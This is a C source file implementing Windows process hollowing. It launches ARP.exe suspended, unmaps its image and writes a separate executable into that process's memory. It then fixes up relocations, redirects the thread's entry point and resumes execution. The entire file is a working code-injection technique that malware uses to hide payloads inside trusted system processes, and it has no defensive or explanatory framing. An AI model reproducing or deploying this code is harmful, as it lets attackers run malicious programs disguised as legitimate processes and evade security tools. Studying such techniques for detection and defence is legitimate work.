#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS(WINAPI* xNtQueryInformationProcess)(
	HANDLE ProcessHandle,
	PROCESSINFOCLASS ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength);

typedef NTSTATUS(WINAPI* xNtUnmapViewOfSection)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
	);

int main()
{
	LPCTSTR sTargetProcessPath = L"C:\\windows\\system32\\ARP.exe";
	LPCTSTR sInjectedFilePath = L"injecteme.exe";

	// start target process in suspended state
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInfo;
	ZeroMemory(&startupInfo, sizeof(startupInfo));
	ZeroMemory(&processInfo, sizeof(processInfo));
	CreateProcess(sTargetProcessPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfo);

	// open injector
	HANDLE hInjectorFile = CreateFile(sInjectedFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	// copy injector image into memory
	DWORD injectorFileSize = GetFileSize(hInjectorFile, NULL);
	LPBYTE pLocalCopy = malloc(injectorFileSize);
	ReadFile(hInjectorFile, pLocalCopy, injectorFileSize, NULL, NULL);
	CloseHandle(hInjectorFile);

	// resolve NtQueryInformationProcess()
	HANDLE hNtdll = GetModuleHandle((LPCWSTR)L"ntdll");
	FARPROC fpNtQueryInformationProcess = GetProcAddress(hNtdll, (LPCSTR)"NtQueryInformationProcess");
	xNtQueryInformationProcess NtQueryInformationProcess = (xNtQueryInformationProcess)fpNtQueryInformationProcess;

	// copy target process's PEB
	PROCESS_BASIC_INFORMATION processBasicInfo;
	PEB targetPEB;
	NtQueryInformationProcess(processInfo.hProcess, 0, &processBasicInfo, sizeof(PROCESS_BASIC_INFORMATION), NULL);
	ReadProcessMemory(processInfo.hProcess, (LPCVOID)processBasicInfo.PebBaseAddress, &targetPEB, sizeof(PEB), NULL);

	// resolve native function NtUnmapViewOfSection()
	FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNtdll, (LPCSTR)"NtUnmapViewOfSection");
	xNtUnmapViewOfSection NtUnmapViewOfSection = (xNtUnmapViewOfSection)fpNtUnmapViewOfSection;

	// unmap target process
	NtUnmapViewOfSection(processInfo.hProcess, targetPEB.Reserved3[1]); // Reserved3[1] field may not work with your version of Windows

	// prepare to fixup injector image
	PIMAGE_NT_HEADERS injectorPEHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pLocalCopy + ((PIMAGE_DOS_HEADER)pLocalCopy)->e_lfanew);
	PIMAGE_SECTION_HEADER injectorSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)injectorPEHeaders + sizeof(IMAGE_NT_HEADERS));
	DWORD injectorModuleSize = injectorPEHeaders->OptionalHeader.SizeOfImage;

	// allocate space in target process
	LPVOID lpRemoteAllocation = VirtualAllocEx(processInfo.hProcess, targetPEB.Reserved3[1], injectorModuleSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// calculate fixup delta
	DWORD_PTR delta = (DWORD_PTR)((LPBYTE)lpRemoteAllocation - (LPBYTE)injectorPEHeaders->OptionalHeader.ImageBase);

	// fixup ImageBase in injector copy
	injectorPEHeaders->OptionalHeader.ImageBase = (ULONGLONG)lpRemoteAllocation;

	// write injector headers to target process
	WriteProcessMemory(processInfo.hProcess, lpRemoteAllocation, pLocalCopy, injectorPEHeaders->OptionalHeader.SizeOfHeaders, NULL);

	// recursively write injector sections to target process
	for (size_t i = 0; i < injectorPEHeaders->FileHeader.NumberOfSections; i++) {
		// skip empty sections
		if (!injectorSectionHeader[i].PointerToRawData)
			continue;

		// calculate section location in target process
		LPVOID psectionDestination = (LPVOID)((LPBYTE)lpRemoteAllocation + injectorSectionHeader[i].VirtualAddress);

		// write this section into memory
		WriteProcessMemory(processInfo.hProcess, psectionDestination, &pLocalCopy[injectorSectionHeader[i].PointerToRawData], injectorSectionHeader[i].SizeOfRawData, NULL);
	}

	// fixup remote image
	if (delta) {
		// find .reloc section
		size_t relocIndex;
		for (relocIndex = 0; relocIndex < injectorPEHeaders->FileHeader.NumberOfSections; relocIndex++)
			if (0 == strcmp(injectorSectionHeader[relocIndex].Name, (const char*)".reloc"))
				break;

		PIMAGE_BASE_RELOCATION relocs = (PIMAGE_BASE_RELOCATION)(pLocalCopy + injectorSectionHeader[relocIndex].PointerToRawData);

		// walk reloc blocks
		while (relocs->VirtualAddress != 0) {
			// only process if block contains relocation descriptors
			if (relocs->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
				// count relocation descriptors
				DWORD numDescriptors = (relocs->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
				LPWORD descriptorList = (LPWORD)((LPBYTE)relocs + sizeof(IMAGE_BASE_RELOCATION));

				// for each descriptor
				for (DWORD i = 0; i < numDescriptors; i++) {
					if (descriptorList[i] > 0) {
						// p points to fixup location (for injector image desired load address)
						DWORD_PTR* fix = (DWORD_PTR*)((LPBYTE)lpRemoteAllocation + (relocs->VirtualAddress + (0x0FFF & (descriptorList[i]))));
						// add delta to fix address in remote process
						DWORD_PTR temp;
						ReadProcessMemory(processInfo.hProcess, fix, &temp, sizeof(DWORD_PTR), NULL);
						temp += delta;
						WriteProcessMemory(processInfo.hProcess, fix, &temp, sizeof(DWORD_PTR), NULL);
					}
				}
			}
			// set reloc pointer to next reloc block
			relocs = (PIMAGE_BASE_RELOCATION)((LPBYTE)relocs + relocs->SizeOfBlock);
		}
	}
	free(pLocalCopy);

	// get primary thread context of target process
	CONTEXT cTargetThreadContext;
	cTargetThreadContext.ContextFlags = CONTEXT_FULL;
	GetThreadContext(processInfo.hThread, &cTargetThreadContext);

	// set new context of target process
	DWORD_PTR entrypoint = (DWORD_PTR)((LPBYTE)lpRemoteAllocation + injectorPEHeaders->OptionalHeader.AddressOfEntryPoint);
	cTargetThreadContext.Rcx = entrypoint;
	SetThreadContext(processInfo.hThread, &cTargetThreadContext);

	// resume thread
	ResumeThread(processInfo.hThread);

	return 0;
}
